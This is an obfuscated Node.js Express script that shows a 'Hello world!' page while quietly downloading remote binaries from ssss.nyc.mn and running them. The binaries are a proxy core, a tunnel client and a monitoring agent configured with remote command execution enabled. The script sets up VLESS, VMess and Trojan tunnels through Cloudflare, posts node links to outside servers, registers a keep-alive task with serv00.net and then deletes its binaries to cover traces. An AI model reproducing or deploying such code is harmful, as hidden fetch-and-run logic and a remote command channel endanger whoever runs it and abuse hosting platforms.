const _0x309c37=_0x2481;(function(_0x16740b,_0x34a641){const _0x2fb8dd=_0x2481,_0x5ac0bd=_0x16740b();while(!![]){try{const _0x5e0dbd=parseInt(_0x2fb8dd(0x232))/0x1*(parseInt(_0x2fb8dd(0x1fc))/0x2)+parseInt(_0x2fb8dd(0x23b))/0x3*(parseInt(_0x2fb8dd(0x239))/0x4)+parseInt(_0x2fb8dd(0x280))/0x5+-parseInt(_0x2fb8dd(0x27a))/0x6+-parseInt(_0x2fb8dd(0x295))/0x7+-parseInt(_0x2fb8dd(0x25c))/0x8*(-parseInt(_0x2fb8dd(0x25b))/0x9)+-parseInt(_0x2fb8dd(0x253))/0xa;if(_0x5e0dbd===_0x34a641)break;else _0x5ac0bd['push'](_0x5ac0bd['shift']());}catch(_0x31a1a0){_0x5ac0bd['push'](_0x5ac0bd['shift']());}}}(_0x2256,0x7aa9f));const express=require(_0x309c37(0x29e)),app=express(),axios=require(_0x309c37(0x248)),os=require('os'),fs=require('fs'),path=require(_0x309c37(0x276)),{promisify}=require(_0x309c37(0x22d)),exec=promisify(require(_0x309c37(0x24c))['exec']),{execSync}=require(_0x309c37(0x24c)),UPLOAD_URL=process[_0x309c37(0x27e)][_0x309c37(0x258)]||'',PROJECT_URL=process[_0x309c37(0x27e)][_0x309c37(0x21a)]||'',AUTO_ACCESS=process[_0x309c37(0x27e)][_0x309c37(0x227)]||![],FILE_PATH=process[_0x309c37(0x27e)][_0x309c37(0x21f)]||_0x309c37(0x256),SUB_PATH=process['env'][_0x309c37(0x269)]||_0x309c37(0x201),PORT=process[_0x309c37(0x27e)][_0x309c37(0x1e7)]||process[_0x309c37(0x27e)][_0x309c37(0x1d8)]||0xbb8,UUID=process['env'][_0x309c37(0x27f)]||_0x309c37(0x22e),NEZHA_SERVER=process[_0x309c37(0x27e)][_0x309c37(0x250)]||'',NEZHA_PORT=process[_0x309c37(0x27e)][_0x309c37(0x296)]||'',NEZHA_KEY=process[_0x309c37(0x27e)][_0x309c37(0x275)]||'',ARGO_DOMAIN=process['env']['ARGO_DOMAIN']||'',ARGO_AUTH=process['env'][_0x309c37(0x1de)]||'',ARGO_PORT=process[_0x309c37(0x27e)][_0x309c37(0x243)]||0x1f41,CFIP=process[_0x309c37(0x27e)][_0x309c37(0x267)]||'cdns.doon.eu.org',CFPORT=process[_0x309c37(0x27e)][_0x309c37(0x274)]||0x1bb,NAME=process[_0x309c37(0x27e)][_0x309c37(0x20e)]||'test';!fs[_0x309c37(0x24a)](FILE_PATH)?(fs[_0x309c37(0x1f0)](FILE_PATH),console[_0x309c37(0x29d)](FILE_PATH+'\x20is\x20created')):console[_0x309c37(0x29d)](FILE_PATH+_0x309c37(0x1df));function generateRandomName(){const _0x536a99=_0x309c37,_0x22d7f0=_0x536a99(0x28b);let _0x17c141='';for(let _0x1026a5=0x0;_0x1026a5<0x6;_0x1026a5++){_0x17c141+=_0x22d7f0[_0x536a99(0x244)](Math[_0x536a99(0x1e4)](Math[_0x536a99(0x271)]()*_0x22d7f0[_0x536a99(0x254)]));}return _0x17c141;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path[_0x309c37(0x247)](FILE_PATH,npmName),phpPath=path[_0x309c37(0x247)](FILE_PATH,phpName),webPath=path[_0x309c37(0x247)](FILE_PATH,webName),botPath=path[_0x309c37(0x247)](FILE_PATH,botName),subPath=path[_0x309c37(0x247)](FILE_PATH,'sub.txt'),listPath=path['join'](FILE_PATH,_0x309c37(0x1e0)),bootLogPath=path[_0x309c37(0x247)](FILE_PATH,_0x309c37(0x279)),configPath=path[_0x309c37(0x247)](FILE_PATH,_0x309c37(0x23d));function deleteNodes(){const _0x2aeb1d=_0x309c37;try{if(!UPLOAD_URL)return;if(!fs[_0x2aeb1d(0x24a)](subPath))return;let _0x35598d;try{_0x35598d=fs[_0x2aeb1d(0x20d)](subPath,_0x2aeb1d(0x1ef));}catch{return null;}const _0x56efba=Buffer[_0x2aeb1d(0x202)](_0x35598d,_0x2aeb1d(0x29f))['toString'](_0x2aeb1d(0x1ef)),_0x2add55=_0x56efba[_0x2aeb1d(0x1f8)]('\x0a')[_0x2aeb1d(0x286)](_0xb5e64e=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x2aeb1d(0x1eb)](_0xb5e64e));if(_0x2add55[_0x2aeb1d(0x254)]===0x0)return;return axios[_0x2aeb1d(0x23e)](UPLOAD_URL+_0x2aeb1d(0x221),JSON[_0x2aeb1d(0x246)]({'nodes':_0x2add55}),{'headers':{'Content-Type':_0x2aeb1d(0x1e9)}})[_0x2aeb1d(0x1ff)](_0x4270c0=>{return null;}),null;}catch(_0x2f7b7b){return null;}}function cleanupOldFiles(){const _0x123e5c=_0x309c37;try{const _0x2f6933=fs[_0x123e5c(0x241)](FILE_PATH);_0x2f6933[_0x123e5c(0x1f6)](_0x1113f5=>{const _0x55c351=_0x123e5c,_0x126efb=path['join'](FILE_PATH,_0x1113f5);try{const _0x541ed9=fs['statSync'](_0x126efb);_0x541ed9[_0x55c351(0x1ec)]()&&fs[_0x55c351(0x245)](_0x126efb);}catch(_0x57492c){}});}catch(_0x548e67){}}function _0x2481(_0x464b98,_0x2cd27c){_0x464b98=_0x464b98-0x1d1;const _0x2256fb=_0x2256();let _0x2481b9=_0x2256fb[_0x464b98];return _0x2481b9;}function _0x2256(){const _0x26a6e0=['/tunnel.yml\x20run','&fp=firefox&type=ws&host=','automatic\x20access\x20task\x20added\x20successfully','ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain','log','express','base64','org','2053','&path=%2Fvless-argo%3Fed%3D2560#','Unhandled\x20error\x20in\x20startserver:','\x0aclient_secret:\x20','message','\x20>/dev/null\x202>&1','PORT','quic','\x20>\x20nul\x202>&1','block','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','web\x20running\x20error:\x20','ARGO_AUTH','\x20already\x20exists','list.txt','\x22\x20>\x20/dev/null\x202>&1','win32','arm','floor','then','https://oooo.serv00.net/add-url','SERVER_PORT','includes','application/json','2096','test','isFile','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','pipe','utf-8','mkdirSync','ARGO_DOMAIN:','tunnel.json','get','error','&path=%2Ftrojan-argo%3Fed%3D2560#','forEach','\x20-s\x20','split','platform','finish','2083','40798KBVRmw','nohup\x20','\x20is\x20running','catch','ArgoDomain:','sub','from','/vmess-argo','status','success','pop','?security=tls&sni=','vmess','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','/trojan-argo','pkill\x20-f\x20\x22[','https://ipapi.co/json/','readFileSync','NAME','php\x20running\x20error:\x20','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20','\x20-c\x20','Nodes\x20uploaded\x20successfully','response','writeFileSync','/vmess-argo?ed=2560','tunnel.yml','Error\x20in\x20startserver:','Error\x20executing\x20command:\x20','country_code','PROJECT_URL','chmod','/vless-argo','createWriteStream','fileUrl','FILE_PATH','\x20>/dev/null\x202>&1\x20&','/api/delete-nodes','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','none','?encryption=none&security=tls&sni=','match','listen','AUTO_ACCESS','Error\x20downloading\x20files:','/sub.txt\x20saved\x20successfully','rm\x20-rf\x20','https://arm64.ssss.nyc.mn/v1','http\x20server\x20is\x20running\x20on\x20port:','util','d491355a-4a45-40e7-9ef1-3c33e4ff66d3','xtls-rprx-vision','clear','has','13RgfFOD','2087','false','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','aarch64','text/plain;\x20charset=utf-8','https://arm64.ssss.nyc.mn/bot','207532LCvKwd','Skipping\x20adding\x20automatic\x20access\x20task','3CfAoUq','127.0.0.1','config.json','post','\x0a\x0avmess://','basename','readdirSync','true','ARGO_PORT','charAt','unlinkSync','stringify','join','axios','data','existsSync','set','child_process','del\x20/f\x20/q\x20','\x0a\x20\x20\x20\x20','NEZHA\x20variable\x20is\x20empty,skip\x20running','NEZHA_SERVER','\x20-c\x20\x22','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','1411780ciBKub','length','Hello\x20world!','./tmp','https://amd64.ssss.nyc.mn/bot','UPLOAD_URL','send','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','15003EKZqQB','4792oUAplh','Download\x20','\x20successfully','push','Empowerment\x20failed\x20for\x20','vless','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','https://arm64.ssss.nyc.mn/agent','arm64','tls','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','CFIP','countryCode','SUB_PATH','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','\x20-p\x20','443','--tls','npm\x20running\x20error:\x20','http','https+local://8.8.8.8/dns-query','random','App\x20is\x20running','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','CFPORT','NEZHA_KEY','path','/api/add-subscriptions','/api/add-nodes','boot.log','3111102KRvFVw','\x0a\x0atrojan://','/dev/null','\x20failed:\x20','env','UUID','2134845NuHhZl','/config.json\x20>/dev/null\x202>&1\x20&','all','substring','\x0a\x20\x20tunnel:\x20','config.yaml','filter','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','Content-Type','Add\x20automatic\x20access\x20task\x20faild:\x20','\x0avless://','abcdefghijklmnopqrstuvwxyz','8443','toString','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','arch','amd','stream','taskkill\x20/f\x20/im\x20','direct','fileName','4063122cjuhBZ','NEZHA_PORT','https://amd64.ssss.nyc.mn/agent','unshift'];_0x2256=function(){return _0x26a6e0;};return _0x2256();}app['get']('/',function(_0x4fd7e9,_0x295b33){const _0x5e7d91=_0x309c37;_0x295b33[_0x5e7d91(0x259)](_0x5e7d91(0x255));});async function generateConfig(){const _0x5b47c2=_0x309c37,_0x4e4afe={'log':{'access':_0x5b47c2(0x27c),'error':'/dev/null','loglevel':'none'},'inbounds':[{'port':ARGO_PORT,'protocol':'vless','settings':{'clients':[{'id':UUID,'flow':_0x5b47c2(0x22f)}],'decryption':_0x5b47c2(0x223),'fallbacks':[{'dest':0xbb9},{'path':_0x5b47c2(0x21c),'dest':0xbba},{'path':'/vmess-argo','dest':0xbbb},{'path':_0x5b47c2(0x20a),'dest':0xbbc}]},'streamSettings':{'network':'tcp'}},{'port':0xbb9,'listen':_0x5b47c2(0x23c),'protocol':_0x5b47c2(0x261),'settings':{'clients':[{'id':UUID}],'decryption':'none'},'streamSettings':{'network':'tcp','security':_0x5b47c2(0x223)}},{'port':0xbba,'listen':_0x5b47c2(0x23c),'protocol':_0x5b47c2(0x261),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0x5b47c2(0x223)},'streamSettings':{'network':'ws','security':'none','wsSettings':{'path':'/vless-argo'}},'sniffing':{'enabled':!![],'destOverride':['http',_0x5b47c2(0x265),'quic'],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x5b47c2(0x23c),'protocol':_0x5b47c2(0x208),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x5b47c2(0x203)}},'sniffing':{'enabled':!![],'destOverride':['http',_0x5b47c2(0x265),_0x5b47c2(0x1d9)],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x5b47c2(0x23c),'protocol':'trojan','settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':'none','wsSettings':{'path':_0x5b47c2(0x20a)}},'sniffing':{'enabled':!![],'destOverride':[_0x5b47c2(0x26f),_0x5b47c2(0x265),'quic'],'metadataOnly':![]}}],'dns':{'servers':[_0x5b47c2(0x270)]},'outbounds':[{'protocol':'freedom','tag':_0x5b47c2(0x293)},{'protocol':'blackhole','tag':_0x5b47c2(0x1db)}]};fs[_0x5b47c2(0x214)](path[_0x5b47c2(0x247)](FILE_PATH,_0x5b47c2(0x23d)),JSON[_0x5b47c2(0x246)](_0x4e4afe,null,0x2));}function getSystemArchitecture(){const _0x24367e=_0x309c37,_0x4912e0=os[_0x24367e(0x28f)]();return _0x4912e0===_0x24367e(0x1e3)||_0x4912e0===_0x24367e(0x264)||_0x4912e0===_0x24367e(0x236)?_0x24367e(0x1e3):_0x24367e(0x290);}function downloadFile(_0xb966e6,_0x176434,_0x3821d6){const _0x11b774=_0x309c37,_0x5b69df=_0xb966e6;!fs[_0x11b774(0x24a)](FILE_PATH)&&fs[_0x11b774(0x1f0)](FILE_PATH,{'recursive':!![]});const _0x4752a6=fs[_0x11b774(0x21d)](_0x5b69df);axios({'method':_0x11b774(0x1f3),'url':_0x176434,'responseType':_0x11b774(0x291)})[_0x11b774(0x1e5)](_0x352c63=>{const _0x5e927e=_0x11b774;_0x352c63[_0x5e927e(0x249)][_0x5e927e(0x1ee)](_0x4752a6),_0x4752a6['on'](_0x5e927e(0x1fa),()=>{const _0x49ba0f=_0x5e927e;_0x4752a6['close'](),console[_0x49ba0f(0x29d)](_0x49ba0f(0x25d)+path['basename'](_0x5b69df)+_0x49ba0f(0x25e)),_0x3821d6(null,_0x5b69df);}),_0x4752a6['on']('error',_0x5f24c8=>{const _0x4f2cc0=_0x5e927e;fs['unlink'](_0x5b69df,()=>{});const _0x2c2d74=_0x4f2cc0(0x25d)+path[_0x4f2cc0(0x240)](_0x5b69df)+_0x4f2cc0(0x27d)+_0x5f24c8[_0x4f2cc0(0x1d6)];console[_0x4f2cc0(0x1f4)](_0x2c2d74),_0x3821d6(_0x2c2d74);});})['catch'](_0x58fb86=>{const _0x15f4c6=_0x11b774,_0x24449f=_0x15f4c6(0x25d)+path['basename'](_0x5b69df)+'\x20failed:\x20'+_0x58fb86[_0x15f4c6(0x1d6)];console['error'](_0x24449f),_0x3821d6(_0x24449f);});}async function downloadFilesAndRun(){const _0x130482=_0x309c37,_0x17b772=getSystemArchitecture(),_0xc061b2=getFilesForArchitecture(_0x17b772);if(_0xc061b2[_0x130482(0x254)]===0x0){console[_0x130482(0x29d)](_0x130482(0x266));return;}const _0x23ad11=_0xc061b2['map'](_0x492b40=>{return new Promise((_0x556c52,_0x4582b7)=>{const _0x31b199=_0x2481;downloadFile(_0x492b40[_0x31b199(0x294)],_0x492b40[_0x31b199(0x21e)],(_0x45c737,_0x4b28c5)=>{_0x45c737?_0x4582b7(_0x45c737):_0x556c52(_0x4b28c5);});});});try{await Promise[_0x130482(0x282)](_0x23ad11);}catch(_0x6b028e){console['error'](_0x130482(0x228),_0x6b028e);return;}function _0x30ec2b(_0x19bb01){const _0x5f1127=0x1fd;_0x19bb01['forEach'](_0x3e11a5=>{const _0x5ef2a8=_0x2481;fs[_0x5ef2a8(0x24a)](_0x3e11a5)&&fs[_0x5ef2a8(0x21b)](_0x3e11a5,_0x5f1127,_0x3e3c15=>{const _0x5901aa=_0x5ef2a8;_0x3e3c15?console[_0x5901aa(0x1f4)](_0x5901aa(0x260)+_0x3e11a5+':\x20'+_0x3e3c15):console[_0x5901aa(0x29d)]('Empowerment\x20success\x20for\x20'+_0x3e11a5+':\x20'+_0x5f1127[_0x5901aa(0x28d)](0x8));});});}const _0x15fa00=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x30ec2b(_0x15fa00);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x10a170=NEZHA_SERVER[_0x130482(0x1e8)](':')?NEZHA_SERVER[_0x130482(0x1f8)](':')[_0x130482(0x206)]():'',_0x831e3b=new Set([_0x130482(0x26c),_0x130482(0x28c),_0x130482(0x1ea),_0x130482(0x233),'2083','2053']),_0x38bbe7=_0x831e3b[_0x130482(0x231)](_0x10a170)?_0x130482(0x242):_0x130482(0x234),_0x53b534=_0x130482(0x1d5)+NEZHA_KEY+'\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20'+NEZHA_SERVER+_0x130482(0x1ed)+_0x38bbe7+_0x130482(0x262)+UUID;fs[_0x130482(0x214)](path[_0x130482(0x247)](FILE_PATH,_0x130482(0x285)),_0x53b534);const _0x53f6df=_0x130482(0x1fd)+phpPath+_0x130482(0x251)+FILE_PATH+_0x130482(0x273);try{await exec(_0x53f6df),console[_0x130482(0x29d)](phpName+_0x130482(0x1fe)),await new Promise(_0x494e4c=>setTimeout(_0x494e4c,0x3e8));}catch(_0x50cef5){console[_0x130482(0x1f4)](_0x130482(0x20f)+_0x50cef5);}}else{let _0x3e79fe='';const _0x558ce5=[_0x130482(0x26c),_0x130482(0x28c),_0x130482(0x1ea),_0x130482(0x233),_0x130482(0x1fb),_0x130482(0x1d2)];_0x558ce5['includes'](NEZHA_PORT)&&(_0x3e79fe=_0x130482(0x26d));const _0x4e25a6='nohup\x20'+npmPath+_0x130482(0x1f7)+NEZHA_SERVER+':'+NEZHA_PORT+_0x130482(0x26b)+NEZHA_KEY+'\x20'+_0x3e79fe+'\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&';try{await exec(_0x4e25a6),console['log'](npmName+_0x130482(0x1fe)),await new Promise(_0x31fe47=>setTimeout(_0x31fe47,0x3e8));}catch(_0x490ca6){console[_0x130482(0x1f4)](_0x130482(0x26e)+_0x490ca6);}}}else console[_0x130482(0x29d)](_0x130482(0x24f));const _0x4f2f27=_0x130482(0x1fd)+webPath+_0x130482(0x211)+FILE_PATH+_0x130482(0x281);try{await exec(_0x4f2f27),console['log'](webName+_0x130482(0x1fe)),await new Promise(_0x40b2a3=>setTimeout(_0x40b2a3,0x3e8));}catch(_0x2d88fe){console[_0x130482(0x1f4)](_0x130482(0x1dd)+_0x2d88fe);}if(fs[_0x130482(0x24a)](botPath)){let _0x559e35;if(ARGO_AUTH['match'](/^[A-Z0-9a-z=]{120,250}$/))_0x559e35=_0x130482(0x222)+ARGO_AUTH;else ARGO_AUTH[_0x130482(0x225)](/TunnelSecret/)?_0x559e35=_0x130482(0x25a)+FILE_PATH+_0x130482(0x299):_0x559e35=_0x130482(0x235)+FILE_PATH+_0x130482(0x28e)+ARGO_PORT;try{await exec('nohup\x20'+botPath+'\x20'+_0x559e35+_0x130482(0x220)),console['log'](botName+_0x130482(0x1fe)),await new Promise(_0x4b8aa0=>setTimeout(_0x4b8aa0,0x7d0));}catch(_0x1bff4a){console[_0x130482(0x1f4)](_0x130482(0x218)+_0x1bff4a);}}await new Promise(_0xdd64aa=>setTimeout(_0xdd64aa,0x1388));}function getFilesForArchitecture(_0x11f8a6){const _0x357369=_0x309c37;let _0x40299c;_0x11f8a6===_0x357369(0x1e3)?_0x40299c=[{'fileName':webPath,'fileUrl':'https://arm64.ssss.nyc.mn/web'},{'fileName':botPath,'fileUrl':_0x357369(0x238)}]:_0x40299c=[{'fileName':webPath,'fileUrl':'https://amd64.ssss.nyc.mn/web'},{'fileName':botPath,'fileUrl':_0x357369(0x257)}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0xb31a0b=_0x11f8a6===_0x357369(0x1e3)?_0x357369(0x263):_0x357369(0x297);_0x40299c['unshift']({'fileName':npmPath,'fileUrl':_0xb31a0b});}else{const _0xf3dfd2=_0x11f8a6===_0x357369(0x1e3)?_0x357369(0x22b):'https://amd64.ssss.nyc.mn/v1';_0x40299c[_0x357369(0x298)]({'fileName':phpPath,'fileUrl':_0xf3dfd2});}}return _0x40299c;}function argoType(){const _0x19e407=_0x309c37;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0x19e407(0x29d)](_0x19e407(0x1dc));return;}if(ARGO_AUTH[_0x19e407(0x1e8)]('TunnelSecret')){fs[_0x19e407(0x214)](path[_0x19e407(0x247)](FILE_PATH,_0x19e407(0x1f2)),ARGO_AUTH);const _0x53607d=_0x19e407(0x284)+ARGO_AUTH[_0x19e407(0x1f8)]('\x22')[0xb]+'\x0a\x20\x20credentials-file:\x20'+path[_0x19e407(0x247)](FILE_PATH,_0x19e407(0x1f2))+_0x19e407(0x252)+ARGO_DOMAIN+_0x19e407(0x287)+ARGO_PORT+_0x19e407(0x210);fs[_0x19e407(0x214)](path[_0x19e407(0x247)](FILE_PATH,_0x19e407(0x216)),_0x53607d);}else console[_0x19e407(0x29d)](_0x19e407(0x209));}async function extractDomains(){const _0x26ebb8=_0x309c37;let _0xe99c8e;if(ARGO_AUTH&&ARGO_DOMAIN)_0xe99c8e=ARGO_DOMAIN,console[_0x26ebb8(0x29d)](_0x26ebb8(0x1f1),_0xe99c8e),await _0x61cbc0(_0xe99c8e);else try{const _0x465ef3=fs['readFileSync'](path[_0x26ebb8(0x247)](FILE_PATH,'boot.log'),'utf-8'),_0x366796=_0x465ef3['split']('\x0a'),_0x3a42c4=[];_0x366796[_0x26ebb8(0x1f6)](_0x43fe88=>{const _0x36f0db=_0x26ebb8,_0x46b415=_0x43fe88[_0x36f0db(0x225)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x46b415){const _0x555a83=_0x46b415[0x1];_0x3a42c4['push'](_0x555a83);}});if(_0x3a42c4[_0x26ebb8(0x254)]>0x0)_0xe99c8e=_0x3a42c4[0x0],console['log'](_0x26ebb8(0x200),_0xe99c8e),await _0x61cbc0(_0xe99c8e);else{console['log'](_0x26ebb8(0x29c)),fs['unlinkSync'](path[_0x26ebb8(0x247)](FILE_PATH,_0x26ebb8(0x279)));async function _0x33aa8f(){const _0x2200a4=_0x26ebb8;try{process[_0x2200a4(0x1f9)]===_0x2200a4(0x1e2)?await exec(_0x2200a4(0x292)+botName+'.exe\x20>\x20nul\x202>&1'):await exec(_0x2200a4(0x20b)+botName[_0x2200a4(0x244)](0x0)+']'+botName[_0x2200a4(0x283)](0x1)+_0x2200a4(0x1e1));}catch(_0x1c277b){}}_0x33aa8f(),await new Promise(_0x14bf55=>setTimeout(_0x14bf55,0xbb8));const _0x298f3b='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20'+FILE_PATH+_0x26ebb8(0x28e)+ARGO_PORT;try{await exec(_0x26ebb8(0x1fd)+botPath+'\x20'+_0x298f3b+_0x26ebb8(0x220)),console['log'](botName+_0x26ebb8(0x1fe)),await new Promise(_0x3f91c5=>setTimeout(_0x3f91c5,0xbb8)),await extractDomains();}catch(_0xce14ad){console[_0x26ebb8(0x1f4)](_0x26ebb8(0x218)+_0xce14ad);}}}catch(_0x49e79c){console['error']('Error\x20reading\x20boot.log:',_0x49e79c);}async function _0x34cec3(){const _0x4e50f3=_0x26ebb8;try{const _0x364ab4=await axios['get'](_0x4e50f3(0x20c),{'timeout':0xbb8});if(_0x364ab4[_0x4e50f3(0x249)]&&_0x364ab4[_0x4e50f3(0x249)][_0x4e50f3(0x219)]&&_0x364ab4['data']['org'])return _0x364ab4[_0x4e50f3(0x249)]['country_code']+'_'+_0x364ab4['data']['org'];}catch(_0x4055cb){try{const _0x5d8139=await axios[_0x4e50f3(0x1f3)]('http://ip-api.com/json/',{'timeout':0xbb8});if(_0x5d8139[_0x4e50f3(0x249)]&&_0x5d8139[_0x4e50f3(0x249)][_0x4e50f3(0x204)]===_0x4e50f3(0x205)&&_0x5d8139[_0x4e50f3(0x249)][_0x4e50f3(0x268)]&&_0x5d8139[_0x4e50f3(0x249)][_0x4e50f3(0x1d1)])return _0x5d8139['data'][_0x4e50f3(0x268)]+'_'+_0x5d8139[_0x4e50f3(0x249)][_0x4e50f3(0x1d1)];}catch(_0x221d12){}}return'Unknown';}async function _0x61cbc0(_0x250d01){const _0x261321=await _0x34cec3(),_0x147aa2=NAME?NAME+'-'+_0x261321:_0x261321;return new Promise(_0x2164e1=>{setTimeout(()=>{const _0x271a8d=_0x2481,_0x4e343e={'v':'2','ps':''+_0x147aa2,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0x271a8d(0x223),'net':'ws','type':_0x271a8d(0x223),'host':_0x250d01,'path':_0x271a8d(0x215),'tls':_0x271a8d(0x265),'sni':_0x250d01,'alpn':'','fp':'firefox'},_0x32dfef=_0x271a8d(0x28a)+UUID+'@'+CFIP+':'+CFPORT+_0x271a8d(0x224)+_0x250d01+_0x271a8d(0x29a)+_0x250d01+_0x271a8d(0x1d3)+_0x147aa2+_0x271a8d(0x23f)+Buffer[_0x271a8d(0x202)](JSON[_0x271a8d(0x246)](_0x4e343e))[_0x271a8d(0x28d)]('base64')+_0x271a8d(0x27b)+UUID+'@'+CFIP+':'+CFPORT+_0x271a8d(0x207)+_0x250d01+'&fp=firefox&type=ws&host='+_0x250d01+_0x271a8d(0x1f5)+_0x147aa2+_0x271a8d(0x24e);console[_0x271a8d(0x29d)](Buffer[_0x271a8d(0x202)](_0x32dfef)[_0x271a8d(0x28d)](_0x271a8d(0x29f))),fs[_0x271a8d(0x214)](subPath,Buffer[_0x271a8d(0x202)](_0x32dfef)[_0x271a8d(0x28d)](_0x271a8d(0x29f))),console['log'](FILE_PATH+_0x271a8d(0x229)),uploadNodes(),app['get']('/'+SUB_PATH,(_0x292293,_0x269621)=>{const _0x17de0a=_0x271a8d,_0x2234cc=Buffer[_0x17de0a(0x202)](_0x32dfef)['toString']('base64');_0x269621[_0x17de0a(0x24b)](_0x17de0a(0x288),_0x17de0a(0x237)),_0x269621[_0x17de0a(0x259)](_0x2234cc);}),_0x2164e1(_0x32dfef);},0x7d0);});}}async function uploadNodes(){const _0x164e4d=_0x309c37;if(UPLOAD_URL&&PROJECT_URL){const _0x57dde2=PROJECT_URL+'/'+SUB_PATH,_0x5cad6d={'subscription':[_0x57dde2]};try{const _0x47be3a=await axios[_0x164e4d(0x23e)](UPLOAD_URL+_0x164e4d(0x277),_0x5cad6d,{'headers':{'Content-Type':_0x164e4d(0x1e9)}});return _0x47be3a&&_0x47be3a[_0x164e4d(0x204)]===0xc8?(console[_0x164e4d(0x29d)]('Subscription\x20uploaded\x20successfully'),_0x47be3a):null;}catch(_0x63e82e){if(_0x63e82e[_0x164e4d(0x213)]){if(_0x63e82e[_0x164e4d(0x213)]['status']===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0x164e4d(0x24a)](listPath))return;const _0x249c13=fs['readFileSync'](listPath,_0x164e4d(0x1ef)),_0x500550=_0x249c13[_0x164e4d(0x1f8)]('\x0a')[_0x164e4d(0x286)](_0x165dcd=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x164e4d(0x1eb)](_0x165dcd));if(_0x500550[_0x164e4d(0x254)]===0x0)return;const _0x3bed36=JSON[_0x164e4d(0x246)]({'nodes':_0x500550});try{const _0x20f761=await axios[_0x164e4d(0x23e)](UPLOAD_URL+_0x164e4d(0x278),_0x3bed36,{'headers':{'Content-Type':_0x164e4d(0x1e9)}});return _0x20f761&&_0x20f761[_0x164e4d(0x204)]===0xc8?(console['log'](_0x164e4d(0x212)),_0x20f761):null;}catch(_0xe3693){return null;}}else return;}}function cleanFiles(){setTimeout(()=>{const _0x3fd74e=_0x2481,_0x58754b=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x58754b['push'](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x58754b[_0x3fd74e(0x25f)](phpPath);process['platform']===_0x3fd74e(0x1e2)?exec(_0x3fd74e(0x24d)+_0x58754b[_0x3fd74e(0x247)]('\x20')+_0x3fd74e(0x1da),_0x441ed4=>{const _0xef6349=_0x3fd74e;console[_0xef6349(0x230)](),console[_0xef6349(0x29d)]('App\x20is\x20running'),console[_0xef6349(0x29d)]('Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!');}):exec(_0x3fd74e(0x22a)+_0x58754b['join']('\x20')+_0x3fd74e(0x1d7),_0xcf9807=>{const _0x5d14e0=_0x3fd74e;console[_0x5d14e0(0x230)](),console[_0x5d14e0(0x29d)](_0x5d14e0(0x272)),console[_0x5d14e0(0x29d)](_0x5d14e0(0x26a));});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x2929c1=_0x309c37;if(!AUTO_ACCESS||!PROJECT_URL){console[_0x2929c1(0x29d)](_0x2929c1(0x23a));return;}try{const _0x581a4f=await axios[_0x2929c1(0x23e)](_0x2929c1(0x1e6),{'url':PROJECT_URL},{'headers':{'Content-Type':_0x2929c1(0x1e9)}});return console['log'](_0x2929c1(0x29b)),_0x581a4f;}catch(_0x25a192){return console[_0x2929c1(0x1f4)](_0x2929c1(0x289)+_0x25a192[_0x2929c1(0x1d6)]),null;}}async function startserver(){const _0x21fccf=_0x309c37;try{argoType(),deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x4b7c90){console[_0x21fccf(0x1f4)](_0x21fccf(0x217),_0x4b7c90);}}startserver()[_0x309c37(0x1ff)](_0x34ee05=>{const _0xa0bc14=_0x309c37;console['error'](_0xa0bc14(0x1d4),_0x34ee05);}),app[_0x309c37(0x226)](PORT,()=>console[_0x309c37(0x29d)](_0x309c37(0x22c)+PORT+'!'));
